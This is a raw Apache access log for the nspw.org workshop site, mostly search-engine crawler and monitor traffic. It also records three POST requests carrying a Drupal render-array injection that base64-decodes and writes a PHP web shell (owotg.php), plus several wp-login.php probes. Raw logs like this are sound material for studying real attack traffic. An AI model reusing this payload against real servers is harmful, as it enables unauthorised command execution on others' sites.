www.nspw.org:80 46.229.168.80 - - [30/Apr/2018:20:35:49 -0400] "GET /2006/program.content.old HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.65 - - [30/Apr/2018:20:36:05 -0400] "GET /1999/index.html HTTP/1.1" 302 522 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.71 - - [30/Apr/2018:20:36:12 -0400] "GET /papers/1995/?C=S%3BO%3DA HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 54.36.148.48 - - [30/Apr/2018:20:36:33 -0400] "GET /2014/organizers HTTP/1.1" 302 499 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 46.229.168.76 - - [30/Apr/2018:20:36:42 -0400] "GET /user HTTP/1.1" 302 500 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.79 - - [30/Apr/2018:20:37:13 -0400] "GET /2003/oc.shtml HTTP/1.1" 302 518 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.65 - - [30/Apr/2018:20:37:39 -0400] "GET /2010/program HTTP/1.1" 302 516 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:20:37:46 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:20:37:52 -0400] "GET /2006/dates.content HTTP/1.1" 302 528 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 106.120.161.64 - - [30/Apr/2018:20:37:58 -0400] "GET / HTTP/1.1" 302 473 "http://www.so.com" "Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20150101 Firefox/32.0 360Spider 360Spider"
www.nspw.org:80 46.229.168.80 - - [30/Apr/2018:20:38:16 -0400] "GET /proceedings/2009 HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 59.124.153.166 - - [30/Apr/2018:20:38:23 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 46.229.168.73 - - [30/Apr/2018:20:38:44 -0400] "GET /2006/cfp.contentQQ HTTP/1.1" 302 528 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.65 - - [30/Apr/2018:20:39:03 -0400] "GET /2017/dates HTTP/1.1" 302 512 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.79 - - [30/Apr/2018:20:39:54 -0400] "GET /1999/photos.html HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.73 - - [30/Apr/2018:20:40:00 -0400] "GET /2017/location HTTP/1.1" 302 518 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.69 - - [30/Apr/2018:20:40:23 -0400] "GET /proceedings/2001 HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:20:40:51 -0400] "GET /2005/oc.content HTTP/1.1" 302 522 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 54.208.102.37 - - [30/Apr/2018:20:41:19 -0400] "GET / HTTP/1.1" 302 529 "http://www.nspw.org/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
www.nspw.org:80 54.208.102.37 - - [30/Apr/2018:20:41:19 -0400] "GET /favicon.ico HTTP/1.1" 302 550 "http://www.nspw.org/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
www.nspw.org:80 46.229.168.77 - - [30/Apr/2018:20:41:31 -0400] "GET /2005/papers.shtml HTTP/1.1" 302 526 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 223.218.104.68 - - [30/Apr/2018:20:41:45 -0400] "GET / HTTP/1.1" 302 525 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
www.nspw.org:80 46.229.168.72 - - [30/Apr/2018:20:41:46 -0400] "GET /2009/proceedings/2012/forms/authors.htm HTTP/1.1" 302 570 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:20:42:02 -0400] "GET /2005/local.content HTTP/1.1" 302 528 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 112.198.73.207 - - [30/Apr/2018:20:42:19 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 112.198.73.207 - - [30/Apr/2018:20:42:20 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.69.8 - - [30/Apr/2018:20:42:27 -0400] "GET /papers/2012/docs/p141.pdf HTTP/1.1" 302 590 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.69 - - [30/Apr/2018:20:42:33 -0400] "GET /2004/?C=S%3BO%3DA HTTP/1.1" 302 526 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:20:42:46 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:20:43:04 -0400] "GET /2005/cfp/latex/toplas.tex HTTP/1.1" 302 542 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:20:43:22 -0400] "GET /papers/1996/?C=M%3BO%3DA HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 54.36.148.187 - - [30/Apr/2018:20:43:47 -0400] "GET /2011/local HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 46.229.168.71 - - [30/Apr/2018:20:43:52 -0400] "GET /proceedings/2000 HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.66 - - [30/Apr/2018:20:44:32 -0400] "GET /papers/2003/?C=D%3BO%3DA HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:20:44:57 -0400] "GET /2014/program HTTP/1.1" 302 516 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 66.249.73.76 - - [30/Apr/2018:20:45:21 -0400] "GET /2005/cfp/latex/toplas.pdf HTTP/1.1" 302 579 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.66 - - [30/Apr/2018:20:45:27 -0400] "GET /2009/proceedings/1994/?C=D%3BO%3DA HTTP/1.1" 302 560 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.69 - - [30/Apr/2018:20:45:59 -0400] "GET /papers/2012/forms/authors.htm HTTP/1.1" 302 550 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 40.77.167.137 - - [30/Apr/2018:20:46:07 -0400] "GET /papers/2005/nspw2005-van_oorschot.pdf HTTP/1.1" 302 603 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 46.229.168.80 - - [30/Apr/2018:20:46:12 -0400] "GET /2011/papers HTTP/1.1" 302 514 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 120.188.87.152 - - [30/Apr/2018:20:46:14 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 120.188.87.152 - - [30/Apr/2018:20:46:16 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 46.229.168.74 - - [30/Apr/2018:20:46:51 -0400] "GET /2008/index.content HTTP/1.1" 302 528 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.66 - - [30/Apr/2018:20:46:58 -0400] "GET /2004/nspw-footer.html HTTP/1.1" 302 534 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.76 - - [30/Apr/2018:20:47:08 -0400] "GET /papers/2004/?C=N%3BO%3DD HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.69 - - [30/Apr/2018:20:47:36 -0400] "GET /2006/nspw-header.shtml HTTP/1.1" 302 536 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:20:47:46 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 216.244.66.236 - - [30/Apr/2018:20:47:47 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 199.16.157.182 - - [30/Apr/2018:20:48:00 -0400] "GET /robots.txt HTTP/1.1" 302 489 "-" "Twitterbot/1.0"
www.nspw.org:80 199.16.157.182 - - [30/Apr/2018:20:48:00 -0400] "GET /2018/cfp HTTP/1.1" 302 485 "-" "Twitterbot/1.0"
www.nspw.org:80 46.229.168.78 - - [30/Apr/2018:20:48:20 -0400] "GET /2009/?C=M%3BO%3DA HTTP/1.1" 302 526 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:20:48:25 -0400] "GET /2005/ieee.clo HTTP/1.1" 302 518 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.78 - - [30/Apr/2018:20:48:33 -0400] "GET /2009/?C=M%3BO%3DA HTTP/1.1" 302 526 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.79 - - [30/Apr/2018:20:49:06 -0400] "GET /papers/2008/?C=N%3BO%3DD HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.76 - - [30/Apr/2018:20:49:12 -0400] "GET /2009/local.content HTTP/1.1" 302 528 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.69 - - [30/Apr/2018:20:49:33 -0400] "GET /2009/proceedings/2001/?C=S%3BO%3DA HTTP/1.1" 302 560 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.73 - - [30/Apr/2018:20:49:56 -0400] "GET /2006/invite/ HTTP/1.1" 302 516 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 66.249.65.119 - - [30/Apr/2018:20:50:15 -0400] "GET /papers/1994/nspw1994-schneier.pdf HTTP/1.1" 302 591 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.69 - - [30/Apr/2018:20:50:20 -0400] "GET /2006/dates.shtml HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:20:50:44 -0400] "GET /2009/proceedings/2006/?C=D%3BO%3DA HTTP/1.1" 302 560 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.66 - - [30/Apr/2018:20:51:12 -0400] "GET /2009/invite/reg.html HTTP/1.1" 302 532 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:20:51:29 -0400] "GET /2005/program.content HTTP/1.1" 302 532 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 83.110.97.117 - - [30/Apr/2018:20:51:51 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 83.110.97.117 - - [30/Apr/2018:20:51:55 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 46.229.168.69 - - [30/Apr/2018:20:51:59 -0400] "GET /2001/index.html HTTP/1.1" 302 522 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:20:52:22 -0400] "GET /2006/invite/preproc.html HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:20:52:46 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 46.229.168.65 - - [30/Apr/2018:20:52:46 -0400] "GET /papers/2012/forms/authors.htm HTTP/1.1" 302 550 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 66.249.73.82 - - [30/Apr/2018:20:52:56 -0400] "GET /2009/proceedings/2010/nspw2010-bratus.pdf HTTP/1.1" 302 611 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.65 - - [30/Apr/2018:20:53:08 -0400] "GET /papers/2003/?C=S%3BO%3DA HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 77.88.47.40 - - [30/Apr/2018:20:53:26 -0400] "GET /2009/oldindex.html HTTP/1.1" 302 565 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
www.nspw.org:80 66.249.73.80 - - [30/Apr/2018:20:53:32 -0400] "GET /papers/2011/nspw2011-pieters.pdf HTTP/1.1" 302 593 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:20:53:33 -0400] "GET /papers/1994/?C=D%3BO%3DA HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.69 - - [30/Apr/2018:20:53:56 -0400] "GET /2002/?C=M%3BO%3DA HTTP/1.1" 302 526 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:20:54:21 -0400] "GET /papers/2010/ HTTP/1.1" 302 516 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:20:54:45 -0400] "GET /papers/2006/?C=D%3BO%3DA HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 216.244.66.200 - - [30/Apr/2018:20:54:45 -0400] "GET /papers/1999/?C=M;O=A HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 46.229.168.76 - - [30/Apr/2018:20:55:30 -0400] "GET /proceedings/2005 HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.76 - - [30/Apr/2018:20:55:30 -0400] "GET /proceedings/2005 HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 95.26.92.231 - - [30/Apr/2018:20:55:32 -0400] "GET /papers/2010/nspw2010-moore.pdf HTTP/1.1" 302 533 "http://pdf.ebook777.com/052/0199918090.pdf" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)"
www.nspw.org:80 66.249.73.78 - - [30/Apr/2018:20:55:39 -0400] "GET /2009/proceedings/2001/nspw2001-hosmer.pdf HTTP/1.1" 302 611 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.72 - - [30/Apr/2018:20:55:42 -0400] "GET /2000/program.html HTTP/1.1" 302 526 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.73 - - [30/Apr/2018:20:56:00 -0400] "GET /2018/organizers HTTP/1.1" 302 522 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 40.77.167.66 - - [30/Apr/2018:20:56:06 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:20:56:18 -0400] "GET /2009/proceedings/1999/?C=D%3BO%3DA HTTP/1.1" 302 560 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 66.249.73.80 - - [30/Apr/2018:20:56:27 -0400] "GET /2009/proceedings/2002/nspw2002-greenwald.pdf HTTP/1.1" 302 617 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:20:56:43 -0400] "GET /papers/2003/?C=N%3BO%3DD HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 216.244.66.200 - - [30/Apr/2018:20:57:00 -0400] "GET /papers/1995/?C=S;O=D HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 46.229.168.75 - - [30/Apr/2018:20:57:05 -0400] "GET /2009/proceedings/2012/forms/authors.htm HTTP/1.1" 302 570 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 66.249.73.80 - - [30/Apr/2018:20:57:30 -0400] "GET /2009/proceedings/1997/nspw1997-nelson.pdf HTTP/1.1" 302 611 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:20:57:40 -0400] "GET /2009/registration.content HTTP/1.1" 302 542 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:20:57:45 -0400] "GET /2009/registration.content HTTP/1.1" 302 542 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:20:57:46 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 46.229.168.66 - - [30/Apr/2018:20:57:51 -0400] "GET /2004/panel.html HTTP/1.1" 302 522 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.66 - - [30/Apr/2018:20:58:08 -0400] "GET /2009/proceedings/?C=N%3BO%3DD HTTP/1.1" 302 550 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.79 - - [30/Apr/2018:20:58:40 -0400] "GET /2003/cfp.shtml.bak HTTP/1.1" 302 528 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:20:58:52 -0400] "GET /papers/1997/ HTTP/1.1" 302 516 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.76 - - [30/Apr/2018:20:59:28 -0400] "GET /2008/invite/workshopformat.html HTTP/1.1" 302 554 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.76 - - [30/Apr/2018:20:59:35 -0400] "GET /2008/pc.content HTTP/1.1" 302 522 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.75 - - [30/Apr/2018:20:59:59 -0400] "GET /2002/nspw-footer.html HTTP/1.1" 302 534 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 213.135.239.28 - - [30/Apr/2018:21:00:05 -0400] "GET /papers/2006/nspw2006-greenwald.pdf HTTP/1.1" 302 541 "-" "Python/3.5 aiohttp/2.3.10"
www.nspw.org:80 46.229.168.77 - - [30/Apr/2018:21:00:18 -0400] "GET /2005/cfp/latex/ieee.clo HTTP/1.1" 302 538 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.77 - - [30/Apr/2018:21:00:35 -0400] "GET /2005/cfp/latex/ieee.clo HTTP/1.1" 302 538 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:21:00:38 -0400] "GET /2002/?C=D%3BO%3DA HTTP/1.1" 302 526 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 216.244.66.200 - - [30/Apr/2018:21:00:44 -0400] "GET /papers/1998/?C=M;O=D HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:21:00:58 -0400] "GET /papers/2012/forms/authors.htm HTTP/1.1" 302 550 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 216.244.66.200 - - [30/Apr/2018:21:01:14 -0400] "GET /2009/proceedings/2013/?C=S;O=A HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:21:01:18 -0400] "GET /2002/dates.shtml HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 111.206.36.12 - - [30/Apr/2018:21:01:29 -0400] "GET / HTTP/1.1" 302 529 "http://www.baidu.com/s?wd=8K1" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
www.nspw.org:80 ::1 - - [30/Apr/2018:21:01:35 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [30/Apr/2018:21:01:36 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [30/Apr/2018:21:01:37 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 216.244.66.200 - - [30/Apr/2018:21:01:43 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:21:01:47 -0400] "GET /2004/nspw-header.html HTTP/1.1" 302 534 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 66.249.73.82 - - [30/Apr/2018:21:02:00 -0400] "GET /papers/2011/nspw2011-bohme.pdf HTTP/1.1" 302 589 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.75 - - [30/Apr/2018:21:02:06 -0400] "GET /2003/?C=S%3BO%3DA HTTP/1.1" 302 526 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 59.124.153.166 - - [30/Apr/2018:21:02:15 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 59.124.153.166 - - [30/Apr/2018:21:02:15 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:21:02:24 -0400] "GET /2005/nspw-header.html HTTP/1.1" 302 534 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 41.66.199.105 - - [30/Apr/2018:21:02:44 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:21:02:46 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
